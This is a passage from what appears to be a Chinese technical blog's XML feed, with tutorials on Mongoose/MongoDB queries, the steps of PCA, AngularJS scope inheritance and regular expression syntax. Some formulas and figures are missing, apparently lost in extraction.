'art']).select('name', 'age', 'tags').skip(20).limit(10).asc('age').slaveOk().hint(&#123; age: 1, name: 1 &#125;).run(callback); Model.$where有时我们需要在 mongodb 中使用 javascript 表达式进行查询，这时可以用 find({$where : javascript}) 方式，$where 是一种快捷方式，并支持链式调用查询。 1Model.$where('this.firstname === this.lastname').exec(callback) Model.update使用 update 子句更新符合指定条件的文档，更新数据在发送到数据库服务器之前会改变模型的类型。 12345var conditions = &#123; name: 'borne' &#125; , update = &#123; $inc: &#123; visits: 1 &#125;&#125; , options = &#123; multi: true &#125;;Model.update(conditions, update, options, callback) 注意：为了向后兼容，所有顶级更新键如果不是原子操作命名的，会统一被按 $set 操作处理，例如： 123456var query = &#123; name: 'borne' &#125;;Model.update(query, &#123; name: 'jason borne' &#125;, options, callback)// 会被这样发送到数据库服务器Model.update(query, &#123; $set: &#123; name: 'jason borne' &#125;&#125;, options, callback) 查询API如果不提供回调函数，所有这些方法都返回 Query 对象，它们都可以被再次修改（比如增加选项、键等），直到调用exec 方法。 123456789var query = Model.find(&#123;&#125;);query.where('field', 5);query.limit(5);query.skip(100);query.exec(function (err, docs) &#123; // called when the `query.complete` or `query.error` are called // internally&#125;); mongodb查询示例1、db.user.find({});2、db.user.find();3、db.user.find({“name”:”user2”});4、db.user.find({},{“name”:1,”password”:1});5、db.user.find({},{“_id”:0});6、查询条件\$lt,\$lte,\$gt,\$gte,\$ne和&lt;,&lt;=,&gt;,&gt;=,!=是一一对应的，它们可以组合起来以查找一个范围内的值。db.user.find({“age”:{“\$gte”:”20”,”\$lte”:”30”}});db.user.find({“age”:{“\$gte”:20,”\$lte”:30}});7、关联查询db.user.find({“age”:{“\$in”:[20,25,26]}});db.user.find({“age”:{“\$nin”:[20,25,26]}});db.user.find({“age”:{“\$in”:[20,25,26]}});用$or用于对多个键做or查询。db.user.find({“\$or”:[{“age”:{“in”:[24,25,26]}},{“name”:”user3”}]});8、特定类型的查询null查询db.user.update({“name”:”user2”},{\$set:{“sex”:null}});db.user.find({“sex”:{“\$in”:[null]}});正则表达式db.user.find({“name”:/^user/});数组查询db.food.find({fruit:{\$all:[“apple”,”banana”]}});db.food.find({“fruit.2”:”peach”});\$size:查询指定长度的数组db.food.find({“fruit”:{“\$size”:3}});]]></content>
      <categories>
        <category>NodeJs</category>
        <category>express</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PCA算法步骤]]></title>
    <url>%2F2017%2F03%2F12%2Fsecond%2F</url>
    <content type="text"><![CDATA[问题问题：假设在IR中我们建立的文档-词项矩阵中，有两个词项为“learn”和“study”，在传统的向量空间模型中，认为两者独立。然而从语义的角度来讲，两者是相似的，而且两者出现频率也类似，是不是可以合成为一个特征呢？ 《模型选择和规则化》谈到的特征选择的问题，就是要剔除的特征主要是和类标签无关的特征。比如“学生的名字”就和他的“成绩”无关，使用的是互信息的方法。 而这里的特征很多是和类标签有关的，但里面存在噪声或者冗余。在这种情况下，需要一种特征降维的方法来减少特征数，减少噪音和冗余，减少过度拟合的可能性。 PCA的思想是将n维特征映射到k维上（k&lt;n），这k维是全新的正交特征。这k维特征称为主元，是重新构造出来的k维特征，而不是简单地从n维特征中去除其余n-k维特征。 ＰＣＡ计算过程：假设我们得到的2维数据如下：行代表了样例，列代表特征，这里有10个样例，每个样例两个特征。可以这样认为，有10篇文档，x是10篇文档中“learn”出现的TF-IDF，y是10篇文档中“study”出现的TF-IDF。第一步分别求x和y的平均值，然后对于所有的样例，都减去对应的均值。这里x的均值是1.81，y的均值是1.91，那么一个样例减去均值后即为（0.69,0.49），得到第二步，求特征协方差矩阵，如果数据是3维，那么协方差矩阵是 这里只有x和y，求解得 对角线上分别是x和y的方差，非对角线上是协方差。协方差是衡量两个变量同时变化的变化程度。协方差大于0表示x和y若一个增，另一个也增；小于0表示一个增，一个减。如果ｘ和ｙ是统计独立的，那么二者之间的协方差就是０；但是协方差是０，并不能说明ｘ和ｙ是独立的。协方差绝对值越大，两者对彼此的影响越大，反之越小。协方差是没有单位的量，因此，如果同样的两个变量所采用的量纲发生变化，它们的协方差也会产生树枝上的变化。第三步，求协方差的特征值和特征向量，得到上面是两个特征值，下面是对应的特征向量，特征值0.0490833989对应特征向量为，这里的特征向量都归一化为单位向量。 第四步，将特征值按照从大到小的顺序排序，选择其中最大的k个，然后将其对应的k个特征向量分别作为列向量组成特征向量矩阵。这里特征值只有两个，我们选择其中最大的那个，这里是1.28402771，对应的特征向量是。 第五步，将样本点投影到选取的特征向量上。假设样例数为m，特征数为n，减去均值后的样本矩阵为DataAdjust(mn)，协方差矩阵是nn，选取的k个特征向量组成的矩阵为EigenVectors(nk)。那么投影后的数据FinalData为这里是 FinalData(101) = DataAdjust(10*2矩阵)×特征向量 得到结果是这样，就将原始样例的n维特征变成了k维，这k维就是原始特征在k维上的投影。 上面的数据可以认为是learn和study特征融合为一个新的特征叫做LS特征，该特征基本上代表了这两个特征。 上述过程有个图描述： 正号表示预处理后的样本点，斜着的两条线就分别是正交的特征向量（由于协方差矩阵是对称的，因此其特征向量正交），最后一步的矩阵乘法就是将原始样本点分别往特征向量对应的轴上做投影。 如果取的k=2，那么结果是这就是经过PCA处理后的样本数据，水平轴（上面举例为LS特征）基本上可以代表全部样本点。整个过程看起来就像将坐标系做了旋转，当然二维可以图形化表示，高维就不行了。上面的如果k=1，那么只会留下这里的水平轴，轴上是所有点在该轴的投影。 这样PCA的过程基本结束。在第一步减均值之后，其实应该还有一步对特征做方差归一化。比如一个特征是汽车速度（0到100），一个是汽车的座位数（2到6），显然第二个的方差比第一个小。因此，如果样本特征中存在这种情况，那么在第一步之后，求每个特征的标准差σ，然后对每个样例在该特征下的数据除以σ。 归纳一下，使用我们之前熟悉的表示方法，在求协方差之前的步骤是： 整个PCA过程貌似及其简单，就是求协方差的特征值和特征向量，然后做数据转换。但是有没有觉得很神奇，为什么求协方差的特征向量就是最理想的k维向量？其背后隐藏的意义是什么？整个PCA的意义是什么？ PCA理论基础要解释为什么协方差矩阵的特征向量就是k维理想特征，我看到的有三个理论：分别是最大方差理论、最小错误理论和坐标轴相关度理论。这里简单探讨前两种，最后一种在讨论PCA意义时简单概述。 最大方差理论 在信号处理中认为信号具有较大的方差，噪声有较小的方差，信噪比就是信号与噪声的方差比，越大越好。如前面的图，样本在横轴上的投影方差较大，在纵轴上的投影方差较小，那么认为纵轴上的投影是由噪声引起的。 因此我们认为，最好的k维特征是将n维样本点转换为k维后，每一维上的样本方差都很大。 比如下图有5个样本点：（已经做过预处理，均值为0，特征方差归一）下面将样本投影到某一维上，这里用一条过原点的直线表示（前处理的过程实质是将原点移到样本点的中心点）。假设我们选择两条不同的直线做投影，那么左右两条中哪个好呢？根据我们之前的方差最大化理论，左边的好，因为投影后的样本点之间方差最大。 这里先解释一下投影的概念：红色点表示样例x(i)，蓝色点表示x(i)在u上的投影，u是直线的斜率也是直线的方向向量，而且是单位向量。蓝色点是x(i)在u上的投影点，离原点的距离是&lt;x(i),u&gt;（即x(i)Tu或者uTx(i)）由于这些样本点（样例）的每一维特征均值都为0，因此投影到u上的样本点（只有一个到原点的距离值）的均值仍然是0。 回到上面左右图中的左图，我们要求的是最佳的u，使得投影后的样本点方差最大。 由于投影后均值为0，因此方差为：假设有这样的二维样本点（红色点），回顾我们前面探讨的是求一条直线，使得样本点投影到直线上的点的方差最大。本质是求直线，那么度量直线求的好不好，不仅仅只有方差最大化的方法。再回想我们最开始学习的线性回归等，目的也是求一个线性函数使得直线能够最佳拟合样本点，那么我们能不能认为最佳的直线就是回归后的直线呢？回归时我们的最小二乘法度量的是样本点到直线的坐标轴距离。比如这个问题中，特征是x，类标签是y。回归时最小二乘法度量的是距离d。如果使用回归方法来度量最佳直线，那么就是直接在原始样本上做回归了，跟特征选择就没什么关系了。 因此，我们打算选用另外一种评价直线好坏的方法，使用点到直线的距离d’来度量。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angularjs之作用域详解]]></title>
    <url>%2F2017%2F03%2F11%2Fsecond%2F</url>
    <content type="text"><![CDATA[简介在angularjs中，子作用域通常会原型继承于其父作用域。有一个例外是当指令使用scope:{…}来定义–这创建了一个没有原型继承的”独立”作用域，这会在创建”可重复使用的组件”的指令时经常使用。如果你设置了scope:true,这个指令会使用原型继承。通常情况下作用域继承非常直白，你甚至不需要知道它在发生什么，直到在一个定义在父作用域上原始类型(例如:number,string,boolean)在子作用域中使用了双向数据绑定(即表单元素，ng-model)。这并不会像大多数人期望的那样工作，而是子作用域得到了它自己的属性，从而覆盖了父作用域上的同名属性。这不是angularjs做的事情-这是JavaScript的原型继承其作用了。新入门的angularjs开发者通常情况下不会意识到ng-repeat、ng-switch、ng-view和ng-include都创建了新的子作用域，所以当使用这些指令的时候，经常会有这种问题发生。关于原始类型的这个问题通过下面的这个最佳建议最容易避免:在你的模型中始终使用’在模型中使用’.’，会确保原型继承始终发生，所以，使用代码 123&lt;input type="text" ng-model="someObj.prop1"/&gt;而不是&lt;input type="text" ng-model="prop1"/&gt; 如果你必须要使用原始类型，有以下两种解决方法:1、在子作用域使用$parent.parentScopeProperty.这会阻止子作用域创建自己的属性。2、在父作用域上定义一个函数，在子作用域上调用，通过该函数传递父作用域上的原始值。 JavaScript原型继承首先我们应该对JavaScript原型继承有一个深入的了解很有必要，尤其你具有服务器端开发的背景，并且对于传统的继承很熟悉。让我们先来复习一下。假设parentScope具有如下属性,aString,aNumber,anArray,anObject和一个aFunction.如果childScope原型继承于parentScope,如下:(注意:为了节省空间，我把anArray展示成一个蓝色的三个值的对象，而不是一个蓝色的拥有三个分离的灰色的对象)如果我们在childScope上获取parentScope上定义的对象，JavaScript会首先在childscope上查找，没有找到该属性，查找其继承的scope,找到这个属性(如果在parentScope上没有找到该属性，会继续查找原型链…直到到达rootScope)。所以，以下全都为真。 1234childScope.aString === 'parent string'childScope.anArray[1] === 20childScope.anObject.property1 === 'parent prop1'childScope.aFunction() === 'parent output' 假设我们有如下代码:1childScope.aString = 'child string' 原型链并没有被遍历，一个新的属性会被添加到childScope上。同时，这个新属性隐藏了和parentScope具有同样名称的属性。这对我们下面讨论ng-repeat和ng-include非常重要假设我们又做了如下操作 12childScope.anArray[1]=22childScope.anObject.property1 = 'child prop1' 原型链被访问了，因为对象(anArray和anObject)在childScope中没有被找到。这两个对象在parentScope中被找到，属性的值在原对象上别更新了。childScope上不会增加新的属性，没有新的对象创建(在JavaScript中数组和函数同样是对象)。假设我们做如下操作: 12childScope.anArray = [100,555]childScope.anObject = [name:'Mark',country:'USA'] 原型链不会被访问，childScope会创建两个新的对象属性，隐藏了和parentScope具有相同名称的属性。重要结论:1、如果我们读取childScope的某个属性childScope.propertyX,并且childScope具有属性propertyX,那么原型链不会被访问。2、如果我们设置childScope的某个属性propertyX,那么原型链不会被访问。最后一个场景: 12delete childScope.anArraychildScope.anArray[1] === 22 //true 首先我们删除了childScope的属性anArray,然后我们尝试再次去获得该属性，原型链被访问了。这个jsfiddle中你可看到javascript原型继承的例子和结果(打开你的浏览器的控制台查看输出) angular scope继承1、如下的指令创建了新的scope，并且基于原型继承:ng-repeat,ng-include,ng-switch,ng-controller,使用scope:true的指令，使用transclude:true指令。2、如下的指令创建了新的scope,并且没有基于原型继承:使用scope:{…}的指令，这创建了”孤立”的scope. ng-include假设我们的controller中的代码如下: 12$scope.myPrimitive = 50;$scope.myObject = &#123;aNumber:11&#125;; html如下: 123456789&lt;script type="text/ng-template" id="/tpl1.html"&gt; &lt;input ng-model="myPrimitive"&gt;&lt;/script&gt;&lt;div ng-include src="'/tpl1.html'"&gt;&lt;/div&gt;&lt;script type="text/ng-template" id="/tpl2.html"&gt; &lt;input ng-model="myObject.aNumber"&gt;&lt;/script&gt;&lt;div ng-include src="'/tpl2.html'"&gt;&lt;/div&gt; 每一个ng-include生成了一个新的基于其父作用域原型继承的子作用域。修改第一个textbox中的值’77’会导致子作用域创建一个新的myPrimitive属性，并且隐藏了父作用域的同名属性，这可能不是你所希望的。修改第二个textbox的值为’99’不会导致创建一个新的子属性。因为tpl2.html绑定了一个对象的属性当ngModel查找对象myObject时原型继承起作用了，最终在parentScope中找到了该属性。如果不想将model从原始类型改为对象类型的话，我们可以使用$parent来重写一个模板。 1&lt;input ng-model="$parent.myprimitive"/&gt; 这次修改第一个textbox的值不会导致生成一个新的子属性。模型现在绑定了parentScope中的属性(因为$parent是子作用域指向父作用域的一个引用)。对于所有作用域(不管是否是原型继承)，angular会通过作用域上的属性\$parent指向scope的父作用域\$\$childHeader指向scope的第一个子作用域\$\$childTail指向scope的最后一个子作用域\$\$nextSibling指向scope的下一个相邻作用域\$\$prevSibling指向scope的上一个相邻作用域这些关系用于AngularJS内部历遍，如\$broadcast和\$emit事件广播，\$digest处理等。对于不涉及表单元素的情况，另一个解决方案是在父作用域中定义一个函数来修改原始数据类型。子作用域总是调用这个函数，由于原型继承子作用域能够访问到该函数。例如: 1234//in the parent scope$scope.setMyPrimitive = function(value)&#123; $scope.myPrimitive = value;&#125; 这是一个使用了”parent function”的简单的jsfiddle ng-switchng-switch scope 的继承和ng-include类似。因此如果你需要双向数据绑定到父作用域中的一个原始数据类型上，使用$parent或者将model改为对象的某个属性。这会避免子作用域隐藏了父作用域的属性。 ng-repeatng-repeat 和以上指令有点差别。假设我们的controller如下： 12$scope.myArrayOfPrimitives = [11,22];$scope.myArrayOfObjects = [&#123;num:10&#125;,&#123;num:202&#125;] html如下: 12345678&lt;ul&gt;&lt;li ng-repeat="num in myArrayOfPrimitives"&gt; &lt;input ng-model="num"&gt;&lt;/input&gt; &lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li ng-repeat="obj in myArrayOfObjects"&gt; &lt;input ng-model="obj.num"&gt;&lt;/input&gt; &lt;/li&gt;&lt;/ul&gt; 对于每次 item的iteration，ng-repeate创建了一个从父作用域原型继承的新的作用域，但是它也将item的值分配给新的子作用域上的一个新的属性（新的属性的名称是循环变量的名称）。如下是ng-repeate的源代码。 12childScope = scope.$new(); // child scope prototypically inherits from parent scope ... childScope[valueIdent] = value; // creates a new childScope property 如果item是一个原始类型（例如上面的myArrayOfPrimitives），本质上该值的一个拷贝被分配给新的子scope。改变了子scope的属性值（即使用ng-model、也就是子scope属性num）并没有改变父scope引用的数组。所以，在上面第一个ng-repeate，每一个子scope会得到一个独立于myArrayOfPrimitives 的num属性。因此这个ng-repeat不会像你希望的那样工作。在Angular1.0.2（包含）以前，修改textbox的值会改变上图中灰色框的值，并且只在child scope中可见。在Angular 1.0.3以上，修改textbox的值不会有任何影响（参考Artem在Stack Overflow的解释）（此处说法有点不太准确，在较新的Angular版本中，修改textbox的值会改变图中灰色框中的值－－译者注）。我们所希望的是修改input的值能够改变数组myArrayOfPrimitives，而不是子scope的一个原始类型的属性。为了达到这个目的，我们需要将模型改为对象的数组（见第2个例子）。因此，如果item是一个对象，原始对象的引用（非拷贝）会被分配成为新的子scope上的属性。修改子scope的属性值（例如，使用ng-model，obj.num）会修改父scope上的值。在上面的第二个ng-repeat中，我们有如下结论：（注意图中的灰线，能清楚的看到发生了什么） 按照预期工作了。修改textbox的值改变了灰色框中的值，同时对子作用域和父作用域都可见。ng-view和ng-include类似ng-controller和ng-include、ng-switch的原理一致，使用ng-controller的嵌套的控制器会引起正常的原型继承。然而，“不建议在两个控制器中通过$scope的继承关系来共享信息“在控制器中共享数据应该使用服务。 指令1、默认（scope:false）－指令没有创建任何新的作用域，因此不存在任何的原型继承。这很简单，但是同样存在隐患，例如：一个指令可能以为它在作用域上创建了一个新的属性，但实际上它修改了一个现有的属性的值。这对于书写可重复使用的组件来说并不是一个好的选择。2、scope: true－指令创建了一个从父作用域基于原型继承的子作用域。如果在同一个DOM上有多个指令需要创建新的作用域，那么只有一个新的子作用域会被创建。既然有“正常“的原型继承，和ng-include 、ng-switch类似，警惕在父作用域上的原始数据类型的双向数据绑定，子作用域会覆盖掉父作用域上的属性。3、scope: { … }－指令创建了一个新的独立作用域。并且没有原型继承。当你创建可以复用的组件时这是一个好的选择，因为指令不能够直接读取或修改父作用域。然而，通常这种指令需要读取父作用域的某些属性。该对象可以在父作用域和独立作用域上使用“＝“创建双向数据绑定，使用“@“创建单向绑定（父作用域改变会影响子作用域，子作用域改变并不会影响父作用域－－译者注）。也可以使用“&amp;“绑定父作用域上的表达式。所以，这些方法同样给子作用域创建了从父作用域衍生的属性。注意这些属性被用来帮助设置绑定－－在对象中你不能直接引用父作用域的属性名称，你需要使用一个HTML属性。例如：如下，你想要在独立作用域上绑定父作用域的属性parentProp将不会起作用：代码 和scope: { localProp: ‘@parentProp’ }。指令想要绑定的父属性必须要有明确的HTML属性名：代码和scope: { localProp: ‘@theParentProp’ }。独立作用域的proto 引用了一个Scope对象。独立作用域的$parent引用了父作用域，尽管这是一个没有原型继承的独立作用域，但他还是一个子作用域。如下图片中：我们有代码 12&lt;my-directive interpolated="&#123;&#123;parentProp1&#125;&#125;" twoway－binding="parentProp2"&gt; 和 scope: &#123; interpolatedProp: '@interpolated', twowayBindingProp: '=twowayBinding' &#125;。同样假设在指令的link函数中有代码scope.someIsolateProp = "I'm isolated" 最后注意：使用link函数中attrs.$observe(‘attr_name’, function(value) { … })来得到独立作用域中使用‘@‘绑定的属性的值。例如：在link函数中有代码–attrs.$observe(‘interpolated’, function(value) { … }) – value会被设置为11。（scope.interpolatedProp在link函数中没有定义（该文章写的时间较早，译者通过测试Angular1.4.7发现在该版本中，这个属性已经有定义了，值为11）。而scope.twowayBindingProp有定义，因为他使用了‘＝‘ ）。4、transclude: true－指令创建了一个新的 “transcluded” 子作用域，并且原型继承于父作用域。因此，如果你的嵌入的内容（即ng-transclude将被替换的内容）需要双向数据绑定到父作用域上的一个原始类型上，使用$parent，或者将模型改为对象，绑定到改对象的某个属性上。这会避免子作用域覆盖父作用域的属性。内嵌作用域和独立作用域是同胞的－－每个scope的\$parent属性指向同一个父作用域。当内嵌作用域和独立作用域同时存在，独立作用域的\$\$nextSibling 属性会指向内嵌作用域。假设上面的指令增加了属性transclude: true ，scope的示意图如下：这个jsfiddle有一个用来检查独立作用域和他相关的内嵌作用域的showScope()函数。参考该fiddle中的注释中的说明。 总结有四种类型的作用域:1、普通原型继承作用域－－ng-include、ng-switch、ng-controller和使用scope: true定义的指令2、含有拷贝属性的普通原型继承作用域－－ng-repeat。每次迭代ng-repeat都会创建一个新的子作用域，同时新的子作用域会得到一个新的属性。3、 独立作用域－－使用scope: {…}定义的指令。这次没有原型继承，但是 ‘=’, ‘@’, and ‘&amp;’提供了一种通过HTML属性获取父作用域属性的机制。4、内嵌作用域－－使用transclude: true定义的指令。这次依旧是正常的基于原型的继承，但是同时他也是任意独立作用域的兄弟作用域。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>angularjs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2F2017%2F03%2F11%2Ffirst%2F</url>
    <content type="text"><![CDATA[正则表达式简介典型的搜索和替换操作要求您提供与预期的搜索结果匹配的确切文本。虽然这种技术对于对静态文本执行简单搜索和替换任务可能已经足够了，但它缺乏灵活性，若采用这种方法搜索动态文本，即使不是不可能，至少也会变得很困难。通过正则表达式，我们可以:1、测试字符串内的模式。例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。2、替换文本。可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。3、基于模式匹配从字符串中提取子字符串。可以查找文档内或输入域内特定的文本。 正则表达式语法1、普通字符普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。2、非打印字符非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列： 字符 描述 \cx 匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \f 匹配一个换页符。等价于 \x0c 和 \cL。 \n 匹配一个换行符。等价于 \x0a 和 \cJ。 \r 匹配一个回车符。等价于 \x0d 和 \cM。 \s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。 \S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 \t 匹配一个制表符。等价于 \x09 和 \cI。 \v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 特殊字符所谓特殊字符，就是一些有特殊含义的字符，如上面说的”.txt”中的，简单的说就是表示任何字符串的意思。如果要查找文件名中有的文件，则需要对进行转义，即在其前加一个\。ls *.txt。许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符 () 放在它们前面。下表列出了正则表达式中的特殊字符： 特别字符 描述 \$ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。 () 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。 * 匹配前面的子表达式零次或多次。要匹配 字符，请使用 \。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。 . 匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用 [。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。 \ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “\”，而 ‘(‘ 则匹配 “(“。 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 \^。 { 标记限定符表达式的开始。要匹配 {，请使用 {。 竖杠 指明两项之间的一个选择。要匹配 竖杠，请使用 \竖杠。 限定符限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有*或+或?或{n}或{n,}或{n,m}共6种。正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo 能匹配 “z” 以及 “zoo”。 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 定位符 字符 描述 ^ 匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。 $ 匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。 \b 匹配一个字边界，即字与空格间的位置。 \B 非字边界匹配。 元字符 字符 描述 \ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “\” 而 “(“ 则匹配 “(“。 ^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。 $ 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。 * 匹配前面的子表达式零次或多次。例如，zo 能匹配 “z” 以及 “zoo”。 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 ? 当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。 (pattern) 匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(‘ 或 ‘)‘。 (?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (竖杠) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y竖杠ies) 就是一个比 ‘industry竖杠industries’ 更简略的表达式。 (?=pattern) 正向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，’Windows (?=95竖杠98竖杠NT竖杠你2000)’ 能匹配 “Windows 2000” 中的 “Windows” ，但不能匹配 “Windows 3.1” 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?!=pattern) 负向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如’Windows (?!95竖杠98竖杠NT竖杠2000)’ 能匹配 “Windows 3.1” 中的 “Windows”，但不能匹配 “Windows 2000” 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 x竖杠y 匹配 x 或 y。例如，’z竖杠food’ 能匹配 “z” 或 “food”。’(z竖杠f)ood’ 则匹配 “zood” 或 “food”。 [xyz] 字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。 [^xyz] 负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。 [a-z] 字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。 [^a-z] 负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。 \b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \B 匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \cx 匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \d 匹配一个数字字符。等价于 [0-9]。 \D 匹配一个非数字字符。等价于 [^0-9]。 \f 匹配一个换页符。等价于 \x0c 和 \cL。 \n 匹配一个换行符。等价于 \x0a 和 \cJ。 \r 匹配一个回车符。等价于 \x0d 和 \cM。 \s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。 \S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 \t 匹配一个制表符。等价于 \x09 和 \cI。 \v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 \w 匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。 \W 匹配任何非单词字符。等价于 ‘[^A-Za-z0-9_]’。 \xn 匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。 \num 匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。 \n 标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。 \nm 标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。 \nml 如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。 \un 匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。 